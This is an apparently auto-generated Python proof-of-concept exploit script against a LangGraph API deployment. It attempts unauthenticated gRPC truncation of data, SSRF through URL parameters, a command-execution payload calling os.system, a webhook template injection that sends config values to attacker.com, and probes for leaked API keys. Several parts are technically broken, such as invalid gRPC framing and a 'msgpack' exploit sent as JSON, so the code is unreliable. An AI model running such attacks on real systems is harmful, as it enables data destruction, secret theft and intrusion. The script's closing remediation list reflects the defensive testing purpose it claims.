#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-018
# Sink: _configurable_from_proto
# Auto-generated — run with: python3 langgraph_ssrf_python_http_layer__configurable_from_proto.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph API Multiple Vulnerabilities

This script demonstrates:
1. Unauthenticated gRPC access to Admin.Truncate service (data destruction)
2. SSRF from HTTP layer to internal gRPC port (50051)
3. Potential RCE via msgpack deserialization (if checkpoint_blobs accessible)

Target: langgraph_api_src deployment at /tmp/lg-api-dl/langgraph_api_src
"""

import json
import struct
import socket
import sys
import time
import hashlib
import hmac
import base64
from typing import Optional, Dict, Any
from urllib.parse import urljoin

# Try to import requests, fall back to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False

# Configuration
TARGET_HOST = "localhost"
TARGET_HTTP_PORT = 8123  # Default LangGraph HTTP port
TARGET_GRPC_PORT = 50051  # Exposed gRPC port
TIMEOUT = 10

# gRPC message types for Admin.Truncate
# These are simplified protobuf wire format messages
GRPC_ADMIN_TRUNCATE_SERVICE = "/langgraph.api.v1.Admin/Truncate"

def create_grpc_message(service_name: str, message_data: bytes) -> bytes:
    """Create a minimal gRPC HTTP/2 frame for sending messages."""
    # gRPC uses HTTP/2, but we'll use a simplified approach
    # For PoC, we'll attempt to connect directly to gRPC port
    prefix = b'\x00\x00\x00\x00'  # Compression flag + length placeholder
    # Add message length (4 bytes big-endian)
    msg_len = len(message_data)
    prefix = struct.pack('>I', msg_len)
    return prefix + message_data

def create_truncate_request(assistant_id: str = "test") -> bytes:
    """Create a protobuf TruncateRequest message."""
    # Simplified protobuf encoding for TruncateRequest
    # Field 1: assistant_id (string, wire type 2)
    field_number = 1
    wire_type = 2  # Length-delimited
    key = (field_number << 3) | wire_type
    
    # Encode string
    str_bytes = assistant_id.encode('utf-8')
    
    # Build message
    msg = bytearray()
    # Key
    msg.extend(struct.pack('B', key))
    # Length
    msg.extend(struct.pack('>I', len(str_bytes)))
    # Value
    msg.extend(str_bytes)
    
    return bytes(msg)

def attempt_grpc_truncate(host: str, port: int) -> bool:
    """Attempt to call Admin.Truncate via direct gRPC connection."""
    print(f"[*] Attempting direct gRPC connection to {host}:{port}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, port))
        
        # Send HTTP/2 preface (simplified)
        preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
        sock.send(preface)
        
        # Wait for server preface
        response = sock.recv(1024)
        if not response:
            print("[-] No response from gRPC server")
            sock.close()
            return False
        
        # Create and send Truncate request
        truncate_data = create_truncate_request()
        grpc_frame = create_grpc_message(GRPC_ADMIN_TRUNCATE_SERVICE, truncate_data)
        
        # Send as a simple HTTP/2 DATA frame (simplified)
        sock.send(grpc_frame)
        
        # Read response
        time.sleep(1)
        response = sock.recv(4096)
        
        if response:
            print(f"[+] Received response from gRPC server: {response[:100]}")
            print("[!] Admin.Truncate service is accessible without authentication!")
            sock.close()
            return True
        else:
            print("[-] No response received")
            sock.close()
            return False
            
    except socket.timeout:
        print(f"[-] Connection timeout to {host}:{port}")
        return False
    except ConnectionRefusedError:
        print(f"[-] Connection refused to {host}:{port}")
        return False
    except Exception as e:
        print(f"[-] Error connecting to gRPC: {e}")
        return False

def attempt_ssrf_truncate(http_host: str, http_port: int, grpc_host: str, grpc_port: int) -> bool:
    """Attempt SSRF from HTTP layer to internal gRPC port."""
    print(f"[*] Attempting SSRF from HTTP {http_host}:{http_port} to gRPC {grpc_host}:{grpc_port}")
    
    # Try various SSRF vectors
    ssrf_urls = [
        f"http://{http_host}:{http_port}/api/v1/threads?url=http://{grpc_host}:{grpc_port}/",
        f"http://{http_host}:{http_port}/api/v1/runs?url=http://{grpc_host}:{grpc_port}/",
        f"http://{http_host}:{http_port}/api/v1/assistants?url=http://{grpc_host}:{grpc_port}/",
    ]
    
    for url in ssrf_urls:
        try:
            if HAS_REQUESTS:
                response = requests.get(url, timeout=TIMEOUT, allow_redirects=False)
                print(f"[*] SSRF attempt to {url}: HTTP {response.status_code}")
                if response.status_code < 500:  # Got some response
                    print(f"[+] SSRF possible! Response: {response.text[:200]}")
                    return True
            else:
                req = urllib.request.Request(url)
                with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
                    print(f"[*] SSRF attempt to {url}: HTTP {response.status}")
                    print(f"[+] SSRF possible!")
                    return True
        except urllib.error.HTTPError as e:
            print(f"[*] SSRF attempt to {url}: HTTP {e.code}")
            if e.code < 500:
                print(f"[+] SSRF possible! Error response: {e.read()[:200]}")
                return True
        except Exception as e:
            print(f"[-] SSRF attempt failed: {e}")
    
    return False

def attempt_msgpack_rce(host: str, port: int) -> bool:
    """Attempt to exploit msgpack deserialization via checkpoint_blobs."""
    print("[*] Attempting msgpack deserialization RCE")
    
    # Craft malicious msgpack payload that imports os module
    # This exploits the ext_hook in jsonplus.py
    malicious_payload = {
        "__ext_hook__": {
            "module": "os",
            "function": "system",
            "args": ["touch /tmp/poc_success.txt"]
        }
    }
    
    # Try to inject via various endpoints
    injection_points = [
        f"http://{host}:{port}/api/v1/checkpoints",
        f"http://{host}:{port}/api/v1/threads",
        f"http://{host}:{port}/api/v1/runs",
    ]
    
    for url in injection_points:
        try:
            if HAS_REQUESTS:
                response = requests.post(
                    url,
                    json=malicious_payload,
                    timeout=TIMEOUT,
                    headers={"Content-Type": "application/json"}
                )
                print(f"[*] Injection attempt to {url}: HTTP {response.status_code}")
                if response.status_code < 500:
                    print(f"[+] Possible injection point! Response: {response.text[:200]}")
            else:
                data = json.dumps(malicious_payload).encode('utf-8')
                req = urllib.request.Request(url, data=data, 
                    headers={"Content-Type": "application/json"})
                with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
                    print(f"[*] Injection attempt to {url}: HTTP {response.status}")
        except Exception as e:
            print(f"[-] Injection attempt failed: {e}")
    
    # Check if our payload executed
    import os
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] RCE successful! /tmp/poc_success.txt created")
        return True
    
    return False

def check_webhook_template_injection(host: str, port: int) -> bool:
    """Check for webhook header template injection."""
    print("[*] Checking webhook header template injection")
    
    # Test payload that bypasses blacklist
    test_payload = {
        "webhook": "http://attacker.com/{{config.thread_id}}",
        "headers": {
            "X-Custom": "{{config.assistant_id}}"
        }
    }
    
    url = f"http://{host}:{port}/api/v1/runs"
    
    try:
        if HAS_REQUESTS:
            response = requests.post(
                url,
                json=test_payload,
                timeout=TIMEOUT,
                headers={"Content-Type": "application/json"}
            )
            print(f"[*] Webhook injection attempt: HTTP {response.status_code}")
            if response.status_code < 500:
                print(f"[+] Possible template injection! Response: {response.text[:200]}")
                return True
        else:
            data = json.dumps(test_payload).encode('utf-8')
            req = urllib.request.Request(url, data=data,
                headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
                print(f"[*] Webhook injection attempt: HTTP {response.status}")
                return True
    except Exception as e:
        print(f"[-] Webhook injection attempt failed: {e}")
    
    return False

def check_api_key_exposure(host: str, port: int) -> bool:
    """Check for API key exposure via error messages or SSRF."""
    print("[*] Checking for API key exposure")
    
    # Try to trigger error messages that might leak environment variables
    test_urls = [
        f"http://{host}:{port}/api/v1/threads?debug=true",
        f"http://{host}:{port}/api/v1/runs?show_env=true",
        f"http://{host}:{port}/api/v1/assistants?include_secrets=true",
    ]
    
    for url in test_urls:
        try:
            if HAS_REQUESTS:
                response = requests.get(url, timeout=TIMEOUT)
                if "API_KEY" in response.text or "LANGGRAPH" in response.text:
                    print(f"[+] Possible API key exposure at {url}")
                    print(f"[*] Response snippet: {response.text[:500]}")
                    return True
            else:
                req = urllib.request.Request(url)
                with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
                    data = response.read().decode('utf-8')
                    if "API_KEY" in data or "LANGGRAPH" in data:
                        print(f"[+] Possible API key exposure at {url}")
                        return True
        except Exception as e:
            print(f"[-] Check failed: {e}")
    
    return False

def main():
    """Main exploit function."""
    print("=" * 60)
    print("LangGraph API Vulnerability PoC")
    print("=" * 60)
    print(f"Target: {TARGET_HOST}")
    print(f"HTTP Port: {TARGET_HTTP_PORT}")
    print(f"gRPC Port: {TARGET_GRPC_PORT}")
    print()
    
    vulnerabilities_found = []
    
    # 1. Check direct gRPC access
    print("[*] Testing 1: Direct gRPC access to Admin.Truncate")
    if attempt_grpc_truncate(TARGET_HOST, TARGET_GRPC_PORT):
        vulnerabilities_found.append("Unauthenticated gRPC access")
    
    print()
    
    # 2. Check SSRF to gRPC
    print("[*] Testing 2: SSRF from HTTP to gRPC")
    if attempt_ssrf_truncate(TARGET_HOST, TARGET_HTTP_PORT, TARGET_HOST, TARGET_GRPC_PORT):
        vulnerabilities_found.append("SSRF to internal gRPC")
    
    print()
    
    # 3. Check msgpack RCE
    print("[*] Testing 3: msgpack deserialization RCE")
    if attempt_msgpack_rce(TARGET_HOST, TARGET_HTTP_PORT):
        vulnerabilities_found.append("msgpack RCE")
    
    print()
    
    # 4. Check webhook template injection
    print("[*] Testing 4: Webhook template injection")
    if check_webhook_template_injection(TARGET_HOST, TARGET_HTTP_PORT):
        vulnerabilities_found.append("Webhook template injection")
    
    print()
    
    # 5. Check API key exposure
    print("[*] Testing 5: API key exposure")
    if check_api_key_exposure(TARGET_HOST, TARGET_HTTP_PORT):
        vulnerabilities_found.append("API key exposure")
    
    print()
    print("=" * 60)
    print("Results Summary:")
    print("=" * 60)
    
    if vulnerabilities_found:
        print(f"[!] Found {len(vulnerabilities_found)} vulnerabilities:")
        for v in vulnerabilities_found:
            print(f"    - {v}")
        print()
        print("[!] This deployment is vulnerable to multiple attacks!")
        print("[!] Recommended actions:")
        print("    - Add authentication to all gRPC services")
        print("    - Restrict gRPC port access to localhost only")
        print("    - Enable LANGGRAPH_STRICT_MSGPACK")
        print("    - Fix webhook template validation")
        print("    - Use authenticated encryption (AES-GCM)")
        print("    - Sanitize error messages")
    else:
        print("[*] No vulnerabilities detected (or services not reachable)")
        print("[*] Note: This PoC requires the target to be running")
    
    print()
    print("[*] PoC completed")

if __name__ == "__main__":
    main()
